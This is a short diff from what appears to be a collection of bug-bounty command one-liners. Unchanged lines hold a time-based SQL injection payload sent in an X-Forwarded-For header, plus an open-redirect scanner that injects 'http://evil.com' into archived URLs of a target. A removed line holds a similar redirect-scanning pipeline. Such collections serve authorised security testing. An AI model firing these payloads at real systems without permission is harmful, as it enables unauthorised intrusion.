@@ -50,9 +50,6 @@ cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),slee
 waybackurls TARGET.COM | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
 ```
 
-```
-gau http://testphp.vulnweb.com | tee -a archive 1>/dev/null && gf redirect archive | cut -f 3- -d ':' | qsreplace "https://cybertix.in" | httpx -silent -status-code -location
-```
 ────────────────────────────────────────────────────────────────────────
 
 
